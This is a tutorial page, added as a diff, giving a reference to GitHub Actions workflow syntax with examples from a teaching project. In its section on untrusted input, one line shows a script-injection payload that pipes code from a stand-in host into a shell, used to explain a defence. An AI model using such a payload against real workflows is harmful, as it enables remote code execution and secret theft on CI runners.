@@ -1,0 +1,326 @@
+---
+title: "GitHub Actions Syntax"
+description: "Every workflow keyword, trigger, expression, context, function and environment file, each with a one-line example from the Lemonade Stand."
+---
+
+## The problem
+
+The Lemonade team now knows the building blocks ([Lesson 2](02-pipeline-building-blocks.qmd)). To use them they must write a workflow file that GitHub understands. YAML is unforgiving: one wrong indent and the workflow does not run, a typo in an expression silently evaluates to an empty string, and a missing `needs` lets the deploy run before the tests finish. This lesson is the reference they keep open while writing `ci.yml`.
+
+::: {.callout-tip}
+## Explain it like I'm ten
+
+A workflow file is a **chore chart for a robot**. It says:
+
+- **When** to start: "when someone pushes to `main`" (`on`).
+- **Which chores** exist: "test", "build", "deploy" (`jobs`).
+- **What order**: "build only after test is finished" (`needs`).
+- **How to do each chore**, line by line (`steps`).
+- **Special rules**: "only deploy if it is `main`" (`if`), "never do two deploys at once" (`concurrency`).
+
+The robot reads the chart exactly as written. It never guesses what you meant, so spelling and spacing matter. GitHub's own [Understanding GitHub Actions](https://docs.github.com/en/actions/get-started/understand-github-actions) page draws the same picture: an event starts a workflow, which runs jobs, which run steps.
+:::
+
+## The anatomy of a workflow file
+
+A workflow is a YAML file in `.github/workflows/`. Its shape is always: **top-level settings → `on` → `jobs` → steps**.
+
+```yaml
+name: CI                         # shown in the Actions tab
+on:
+  push:
+    branches: [main]             # trigger
+jobs:
+  test:                          # job id (letters, digits, - and _)
+    runs-on: ubuntu-latest       # runner
+    steps:
+      - uses: actions/checkout@v7    # an action
+      - run: npm test                # a shell command
+```
+
+YAML rules you need: two spaces per indent level (never tabs); `key: value` for maps; `- item` for list items; `[a, b]` is a short list; a line ending in `|` starts a multi-line string. Quote strings that start with `*`, `{`, `!` or `@`, because YAML gives those characters a special meaning.
+
+## Top-level keys
+
+| Keyword | What it does | Rule / convention | Example |
+| --- | --- | --- | --- |
+| `name` | Workflow name in the UI | Short, unique per repo | `name: CI` |
+| `run-name` | Title of each run; may use `github` and `inputs` | Put the variable part first | `run-name: Deploy ${{ inputs.image }}` |
+| `on` | Events that start the workflow | Required | `on: [push, pull_request]` |
+| `permissions` | Rights of the automatic `GITHUB_TOKEN` | Start with `contents: read`, add per job | `permissions: { contents: read }` |
+| `env` | Environment variables for every job | Plain, non-secret values only | `env: { NODE_ENV: test }` |
+| `defaults` | Default `shell` and `working-directory` for `run` steps | Use when code lives in a subfolder | `defaults: { run: { working-directory: app } }` |
+| `concurrency` | Allows only one run per group at a time; add `cancel-in-progress: true` to stop the older run | Cancel stale pull-request runs; never cancel deploys | `concurrency: ci-${{ github.ref }}` |
+| `jobs` | The jobs, keyed by job id | Required | `jobs: { test: ... }` |
+
+## Triggers: `on`
+
+| Keyword | What it does | Rule / convention | Example |
+| --- | --- | --- | --- |
+| `push` | Runs when commits or tags are pushed | Usually limit to `main` | `push: { branches: [main] }` |
+| `pull_request` | Runs on pull-request activity, using the merge result | Default activity types: `opened`, `synchronize`, `reopened` | `pull_request: { branches: [main] }` |
+| `workflow_dispatch` | Adds a "Run workflow" button, with typed inputs | Input types: `string`, `boolean`, `number`, `choice`, `environment` | `workflow_dispatch: { inputs: { image: { type: string, required: true } } }` |
+| `schedule` | Runs on a timer (cron, UTC by default) | Only on the default branch; shortest interval 5 minutes; avoid minute `0` | `schedule: [{ cron: '17 3 * * *' }]` |
+| `workflow_call` | Makes this workflow reusable by other workflows | Declare `inputs`, `secrets`, `outputs` | `workflow_call: { inputs: { environment: { type: string } } }` |
+| `branches` / `branches-ignore` | Filter by branch name (glob patterns) | Do not use both for one event; use `!pattern` inside `branches` | `branches: [main, 'release/**']` |
+| `tags` / `tags-ignore` | Filter pushes by tag name | Good for release workflows | `tags: ['v*.*.*']` |
+| `paths` / `paths-ignore` | Run only when matching files change | A skipped workflow reports no status | `paths-ignore: ['**.md']` |
+| `types` | Pick activity types of an event | Default types differ per event | `pull_request: { types: [opened, labeled] }` |
+
+**Cron in one minute.** The five fields are *minute hour day-of-month month day-of-week*. `'17 3 * * 1-5'` means "at 03:17 UTC, Monday to Friday". `*` means "every value", `1-5` is a range, `*/15` is "every 15th", `0,30` is a list. Quote the string, because a value starting with `*` is special in YAML.
+
+## Job keys: `jobs.<job_id>`
+
+| Keyword | What it does | Rule / convention | Example |
+| --- | --- | --- | --- |
+| `name` | Display name (also the status-check name) | Keep it stable if it is a required check | `name: Test on Node ${{ matrix.node }}` |
+| `runs-on` | Runner label | `ubuntu-latest` unless you need more | `runs-on: ubuntu-latest` |
+| `needs` | Jobs that must succeed first | Gives access to `needs.<id>.outputs` | `needs: [test, lint]` |
+| `if` | Run the job only when true | `${{ }}` optional, but required if it starts with `!` | `if: github.ref == 'refs/heads/main'` |
+| `environment` | Deploy target; applies its protection rules and secrets | Name must match **Settings → Environments** | `environment: production` |
+| `outputs` | Values exported to later jobs | Map each name to a step output | `ref: ${{ steps.build.outputs.digest }}` (under `outputs:`) |
+| `steps` | The list of steps | Run top to bottom; stop at the first failure | `steps: [ ... ]` |
+| `timeout-minutes` | Kill the job after this long | Default 360; set something realistic | `timeout-minutes: 10` |
+| `continue-on-error` | A failure does not fail the workflow | Only for experimental jobs | `continue-on-error: true` |
+| `permissions` | Token rights for this job only | Widen here, not at the top | `permissions: { packages: write }` |
+| `env` / `defaults` | Same as top level, for one job | Job values override top-level ones | `env: { PORT: 8080 }` |
+| `concurrency` | One run per group for this job | Use for deploy jobs | `concurrency: deploy-production` |
+| `strategy.matrix` | Run the job once per combination of values | Max 256 jobs per run | `matrix: { node: [24, 26] }` |
+| `strategy.matrix.include` | Add combinations, or extra keys to matching ones | Applied after `exclude` | `include: [{ node: 26, coverage: true }]` |
+| `strategy.matrix.exclude` | Remove combinations | Must match a full or partial combination | `exclude: [{ os: windows-latest, node: 24 }]` |
+| `strategy.fail-fast` | Cancel other matrix jobs when one fails | Default `true`; set `false` to see every result | `fail-fast: false` |
+| `strategy.max-parallel` | Limit how many matrix jobs run at once | Default: as many as runners allow | `max-parallel: 2` |
+| `container` | Run all steps inside this container image | Steps then see the container's tools | `container: node:26-alpine` |
+| `services` | Side containers (databases, caches) for the job | Reach them by label in a container job, or `localhost` with `ports` | `services: { redis: { image: redis:8 } }` |
+| `uses` | Call a reusable workflow instead of steps | No `steps` or `runs-on` with it | `uses: ./.github/workflows/deploy.yml` |
+| `with` / `secrets` | Inputs and secrets for that reusable workflow | `secrets: inherit` passes all | `secrets: inherit` |
+
+## Step keys: `jobs.<job_id>.steps[*]`
+
+| Keyword | What it does | Rule / convention | Example |
+| --- | --- | --- | --- |
+| `name` | Label in the log | Say what the step checks | `name: Run unit tests` |
+| `uses` | Run an action | `owner/repo@ref`, `./local/path` or `docker://image` | `uses: actions/setup-node@v7` |
+| `run` | Run shell commands | End the line with a block-scalar bar for several lines, as in the anatomy example | `run: npm test` |
+| `with` | Inputs for the action | Names come from the action's `action.yml` | `with: { node-version: 26 }` |
+| `env` | Variables for this step only | Pass secrets and untrusted text this way | `TOKEN: ${{ secrets.TOKEN }}` (under `env:`) |
+| `id` | Names the step so others can read its outputs | Needed for `steps.<id>.outputs` | `id: build` |
+| `if` | Run the step only when true | Use status functions for clean-up steps | `if: failure()` |
+| `shell` | Which shell runs `run` | `shell: bash` adds `-o pipefail` | `shell: bash` |
+| `working-directory` | Folder for `run` | Relative to the workspace | `working-directory: app` |
+| `continue-on-error` | Let the job go on if this step fails | Rarely right; hides failures | `continue-on-error: true` |
+| `timeout-minutes` | Kill this step after this long | For steps that may hang | `timeout-minutes: 3` |
+
+## Expressions: `${{ ... }}`
+
+Anything inside `${{ }}` is evaluated by GitHub **before** the step runs; the result is pasted into the YAML. Literals are `true`, `false`, `null`, numbers and `'single-quoted strings'`. String comparison ignores case.
+
+```yaml
+if: github.event_name == 'push' && github.ref == 'refs/heads/main'
+if: ${{ !cancelled() }}                      # starts with !, so ${{ }} is required
+run: echo "${{ github.event_name == 'push' && 'deploy' || 'skip' }}"  # a ? b : c
+```
+
+Operators: `( )`, `[ ]`, `.`, `!`, `<`, `<=`, `>`, `>=`, `==`, `!=`, `&&` and `||`. The pattern `cond && a || b` acts like "if `cond` then `a` else `b`" as long as `a` is not empty or false.
+
+### Contexts: where values come from
+
+| Context | What it holds | Rule / convention | Example |
+| --- | --- | --- | --- |
+| `github` | The event and repository: `sha`, `ref`, `actor`, `event_name`, `repository`, `event` | Fields from `github.event` can be attacker-controlled text | `${{ github.sha }}` |
+| `env` | Variables set with `env:` | Not available in job-level `if` | `${{ env.NODE_ENV }}` |
+| `vars` | Configuration variables (repo, org, environment) | For non-secret settings | `${{ vars.LEMONADE_URL }}` |
+| `secrets` | Encrypted secrets, plus `GITHUB_TOKEN` | Masked in logs; empty in fork pull requests | `${{ secrets.KUBECONFIG_B64 }}` |
+| `inputs` | `workflow_dispatch` or `workflow_call` inputs | Typed: booleans are real booleans | `${{ inputs.environment }}` |
+| `matrix` | The current matrix combination | Only inside a matrix job | `${{ matrix.node }}` |
+| `strategy` | Matrix bookkeeping: `job-index`, `job-total` | Rarely needed | `${{ strategy.job-index }}` |
+| `needs` | Results and outputs of jobs in `needs` | `needs.<id>.result` is `success`, `failure`, `cancelled` or `skipped` | `${{ needs.image.outputs.ref }}` |
+| `steps` | Outputs and results of earlier steps with an `id` | `outcome` is before `continue-on-error`, `conclusion` after | `${{ steps.build.outputs.digest }}` |
+| `runner` | The machine: `os`, `arch`, `temp` | Use `runner.temp` for scratch files | `${{ runner.os }}` |
+| `job` | The current job: `status`, `container`, `services` | Handy in clean-up steps | `${{ job.status }}` |
+
+### Functions
+
+| Function | What it returns | Rule / convention | Example |
+| --- | --- | --- | --- |
+| `success()` | True if nothing before has failed or been cancelled | The default for every `if` | `if: success()` |
+| `failure()` | True if an earlier step or needed job failed | For rollback and alerts | `if: failure()` |
+| `always()` | Always true, even when cancelled | Prefer `!cancelled()` so a cancel really stops | `if: always()` |
+| `cancelled()` | True if the run was cancelled | Usually used as `!cancelled()` | `if: ${{ !cancelled() }}` |
+| `contains(a, b)` | Is `b` in string or array `a`? | Case-insensitive | `contains(github.event.pull_request.labels.*.name, 'deploy')` |
+| `startsWith(a, b)` | Does `a` start with `b`? | Case-insensitive | `startsWith(github.ref, 'refs/tags/v')` |
+| `endsWith(a, b)` | Does `a` end with `b`? | Case-insensitive | `endsWith(github.repository, '-demo')` |
+| `format(s, ...)` | Fills `{0}`, `{1}` in `s` | Use `{{` for a literal brace | `format('lemonade-{0}', github.sha)` |
+| `join(arr, sep)` | Joins an array into a string | Default separator `,` | `join(matrix.tags, ' ')` |
+| `toJSON(x)` | Pretty JSON text of a value | Great for debugging | `toJSON(github.event)` |
+| `fromJSON(s)` | Parses JSON text into a value | Turns text into booleans, numbers or a dynamic matrix | `fromJSON(needs.plan.outputs.matrix)` |
+| `hashFiles(p)` | SHA-256 of the matching files, or `''` if none | For cache keys | `hashFiles('**/package-lock.json')` |
+
+## Environment files: talking back to the runner
+
+A step cannot change the YAML, but it can write to special files whose paths GitHub puts in environment variables.
+
+| File variable | What writing to it does | Rule / convention | Example |
+| --- | --- | --- | --- |
+| `GITHUB_OUTPUT` | Sets a step output, read as `steps.<id>.outputs.<name>` | One `name=value` per line; step needs an `id` | `echo "tag=v1.2.0" >> "$GITHUB_OUTPUT"` |
+| `GITHUB_ENV` | Sets an environment variable for **later** steps of the job | Not visible in the same step | `echo "KUBECONFIG=$RUNNER_TEMP/kc" >> "$GITHUB_ENV"` |
+| `GITHUB_PATH` | Adds a folder to `PATH` for later steps | One folder per line | `echo "$HOME/.local/bin" >> "$GITHUB_PATH"` |
+| `GITHUB_STEP_SUMMARY` | Adds Markdown to the run's summary page | Keep it short and useful | `echo "Deployed \`$IMAGE\`" >> "$GITHUB_STEP_SUMMARY"` |
+
+Common read-only variables: `GITHUB_SHA` (commit), `GITHUB_REF` (for example `refs/heads/main`), `GITHUB_REPOSITORY` (`owner/repo`), `GITHUB_WORKSPACE` (checkout folder), `RUNNER_TEMP` (a scratch folder emptied after each job).
+
+## Worked examples
+
+Each snippet shows one idea from the Lemonade workflows.
+
+**A matrix.** Test on two Node versions without copying the job:
+
+```yaml
+test:
+  runs-on: ubuntu-latest
+  strategy:
+    fail-fast: false
+    matrix:
+      node: [24, 26]
+  steps:
+    - uses: actions/checkout@v7
+    - uses: actions/setup-node@v7
+      with:
+        node-version: ${{ matrix.node }}
+    - run: npm test
+```
+
+**Passing a value from a step, to a job output, to another job.** This is exactly how `ci.yml` hands the image reference to the deploy jobs:
+
+```yaml
+image:
+  runs-on: ubuntu-latest
+  outputs:
+    ref: ${{ steps.name.outputs.repo }}        # 2. job output
+  steps:
+    - id: name
+      run: echo "repo=ghcr.io/acme/lemonade-stand" >> "$GITHUB_OUTPUT"   # 1. step output
+staging:
+  needs: image
+  runs-on: ubuntu-latest
+  steps:
+    - run: echo "Deploying ${{ needs.image.outputs.ref }}"              # 3. read it
+```
+
+**Only deploy from `main`, and clean up even after a failure:**
+
+```yaml
+deploy:
+  if: github.ref == 'refs/heads/main'
+  steps:
+    - run: kubectl -n lemonade rollout status deployment/lemonade-web
+    - if: failure()
+      run: kubectl -n lemonade rollout undo deployment/lemonade-web
+```
+
+**Passing untrusted text safely.** A pull-request title is written by whoever opened it. Never paste it straight into a script:
+
+```yaml
+- env:
+    TITLE: ${{ github.event.pull_request.title }}
+  run: echo "Testing: $TITLE"          # safe: the shell sees a variable, not code
+```
+
+If you wrote `run: echo "${{ github.event.pull_request.title }}"` instead, a title such as `"; curl evil.example | sh; echo "` would become part of the script. This is called **script injection**.
+
+The full, linted versions are [`ci.yml`](examples/lemonade-stand/workflows/ci.yml) and [`deploy.yml`](examples/lemonade-stand/workflows/deploy.yml). Both pass [actionlint](https://github.com/rhysd/actionlint), a free linter for workflow files:
+
+```bash
+docker run --rm -v "$PWD:/repo" --workdir /repo rhysd/actionlint:latest -no-color
+echo $?     # 0 means no problems found
+```
+
+## Rules and conventions
+
+- One workflow per purpose: `ci.yml`, `deploy.yml`, `nightly.yml`.
+- Set `permissions: contents: read` at the top; widen per job.
+- Pin actions to a major version (`@v7`) at minimum; security-sensitive teams pin full commit SHAs.
+- Set `timeout-minutes` on every job so a hang cannot burn six hours.
+- Put secrets and any user-controlled text into `env:`, then use `"$VAR"` in the shell.
+- Use `concurrency` to cancel stale pull-request runs, and to serialise deployments.
+- Keep `name:` of required checks stable; renaming one breaks branch protection.
+- Lint workflows with actionlint before pushing.
+
+## Common mistakes
+
+| Mistake | Symptom | Fix |
+| --- | --- | --- |
+| Tabs or wrong indentation | "Invalid workflow file" banner; nothing runs | Two spaces per level; run actionlint |
+| Typo in a context, such as `${{ secret.TOKEN }}` | Value is silently empty | actionlint flags unknown contexts |
+| `if: !cancelled()` without `${{ }}` | YAML error, because `!` starts a YAML tag | `if: ${{ !cancelled() }}` |
+| Writing to `GITHUB_ENV` and reading it in the same step | Variable is empty | Read it in the next step, or use a normal shell variable |
+| Forgetting `id` on a step | `steps.build.outputs.digest` is empty | Add `id: build` |
+| Schedule at `0 * * * *` | Runs late or skipped at busy times | Pick an odd minute such as `17` |
+| Piping a command into `tee` without `shell: bash` | The step passes even though the first command failed, because the default shell has no `pipefail` | Add `shell: bash`, or `set -o pipefail` |
+
+## Mathematical Abstraction
+
+### Matrix size
+
+A matrix with keys $A_1, \dots, A_k$ creates one job per combination, the **Cartesian product** of their value lists, minus excluded combinations, plus new combinations from `include`:
+
+$$
+|J| = \prod_{i=1}^{k} |A_i| \; - \; |X| \; + \; |I_{\text{new}}|
+$$
+
+where
+
+- $k$ is the number of matrix keys (for example `os` and `node`);
+- $A_i$ is the list of values for key $i$, and $|A_i|$ is how many values it has;
+- $\prod_{i=1}^{k}$ multiplies the counts together;
+- $X$ is the set of combinations removed by `exclude`, and $|X|$ its size;
+- $I_{\text{new}}$ is the set of `include` entries that cannot be merged into any existing combination without overwriting one of its original values (the other entries only add keys and create no job);
+- $|J|$ is the number of jobs GitHub starts (at most 256).
+
+**Example.** `os: [ubuntu-latest, windows-latest]` and `node: [24, 26]`, with `exclude: [{os: windows-latest, node: 24}]` and `include: [{os: macos-latest, node: 26}]`:
+
+$$
+|J| = (2 \times 2) - 1 + 1 = 4 - 1 + 1 = 4 \text{ jobs.}
+$$
+
+### Waves with `max-parallel`
+
+If $m$ is `max-parallel`, the jobs run in waves:
+
+$$
+W = \left\lceil \frac{|J|}{m} \right\rceil
+$$
+
+where
+
+- $m$ is the value of `max-parallel` (a whole number, $m \ge 1$);
+- $\lceil x \rceil$ rounds $x$ up to the next whole number;
+- $W$ is the number of waves.
+
+**Example.** $|J| = 4$ jobs and $m = 3$: $W = \lceil 4/3 \rceil = \lceil 1.33 \rceil = 2$ waves. If each matrix job takes 2 minutes, the matrix needs about $2 \times 2 = 4$ minutes instead of 2 minutes with no limit.
+
+### How often a schedule fires
+
+A cron field with a step, such as `*/15` in the minute position, fires $60/s$ times an hour, so per day:
+
+$$
+R = \frac{60}{s} \times h
+$$
+
+where
+
+- $s$ is the step in minutes (it must divide 60 evenly for this simple count, and $s \ge 5$ on GitHub);
+- $h$ is how many hours of the day match the hour field;
+- $R$ is the number of runs per day.
+
+**Example.** `'*/15 8-17 * * *'`: $s = 15$, and the hours 8 to 17 are $h = 10$ hours, so $R = \frac{60}{15} \times 10 = 4 \times 10 = 40$ runs per day.
+
+## References
+
+- GitHub Docs, [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax).
+- GitHub Docs, [Events that trigger workflows](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows).
+- GitHub Docs, [Contexts reference](https://docs.github.com/en/actions/reference/workflows-and-actions/contexts) and [Evaluate expressions](https://docs.github.com/en/actions/reference/workflows-and-actions/expressions).
+- GitHub Docs, [Workflow commands](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands) and [Variables reference](https://docs.github.com/en/actions/reference/workflows-and-actions/variables).
+- rhysd, [actionlint](https://github.com/rhysd/actionlint).
+
+[← Previous: Pipeline Building Blocks](02-pipeline-building-blocks.qmd) · [Part index](index.qmd) · [Next: Automated Testing in the Pipeline →](04-automated-testing-in-the-pipeline.qmd)
